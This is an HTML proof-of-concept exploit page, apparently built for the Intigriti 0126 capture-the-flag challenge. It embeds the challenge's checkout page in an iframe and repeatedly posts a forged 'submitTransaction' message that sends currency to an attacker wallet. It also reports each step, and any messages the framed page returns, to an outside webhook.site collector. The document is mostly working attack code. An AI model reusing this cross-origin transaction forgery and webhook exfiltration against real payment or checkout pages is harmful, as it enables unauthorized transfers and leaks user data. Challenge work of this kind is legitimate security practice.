<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 0126 - Debug Iframe</title>
    <meta charset="UTF-8">
    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}iframe{width:800px;height:600px;border:2px solid #00ff00;}</style>
</head>
<body>
    <h1>DEBUG - Visible Iframe</h1>
    <div id="log">Loading checkout...</div>
    <iframe id="checkoutFrame" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>

    <script>
        const WEBHOOK = 'https://webhook.site/a0c5dc4c-1b40-463c-95b6-64ea3c45809c';
        const YOUR_WALLET = '1cffcc33e631193cce307bda88be77345e';
        const BASE = 'https://challenge-0126.intigriti.io';

        function log(msg) {
            document.getElementById('log').innerHTML += '<br>' + msg;
            console.log(msg);
        }

        function track(step, status, data = {}) {
            fetch(`${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`, { mode: 'no-cors' }).catch(() => {});
        }

        track('start', 'loaded', {});

        const iframe = document.getElementById('checkoutFrame');

        // Try multiple times to send postMessage
        const delays = [3000, 5000, 7000, 10000, 15000];

        delays.forEach((delay, index) => {
            setTimeout(() => {
                log(`Attempt ${index + 1} (${delay}ms): Sending postMessage...`);
                track(`attempt_${index+1}`, 'sending', { delay });

                try {
                    iframe.contentWindow.postMessage({
                        type: 'submitTransaction',
                        transaction: {
                            toAddress: YOUR_WALLET,
                            currency: '1337COIN',
                            amount: 1
                        }
                    }, '*');

                    track(`sent_${index+1}`, 'success', { delay });
                    log(`  → postMessage sent at ${delay}ms`);
                } catch (e) {
                    track(`error_${index+1}`, 'failed', { error: e.message, delay });
                    log(`  → Error: ${e.message}`);
                }
            }, delay);
        });

        // Listen for responses
        window.addEventListener('message', (event) => {
            log(`[RECEIVED] ${JSON.stringify(event.data).substring(0, 150)}`);
            track('msg_received', 'info', {
                data: JSON.stringify(event.data).substring(0, 200),
                origin: event.origin
            });
        });

        // Check iframe status periodically
        setInterval(() => {
            try {
                // This will fail due to cross-origin, but tells us if iframe is still there
                const loc = iframe.contentWindow.location.href;
                log(`Iframe URL: ${loc.substring(0, 50)}...`);
            } catch(e) {
                // Expected - cross-origin
                log('Iframe is loaded (cross-origin)');
            }
        }, 5000);

        // Final summary
        setTimeout(() => {
            log('=== SUMMARY ===');
            log('If you see NO "msg_received" events above, checkout never responded.');
            log('This means checkout either: redirected, no session, or event handler not attached.');
            track('summary', 'done', {});
        }, 20000);
    </script>
</body>
</html>
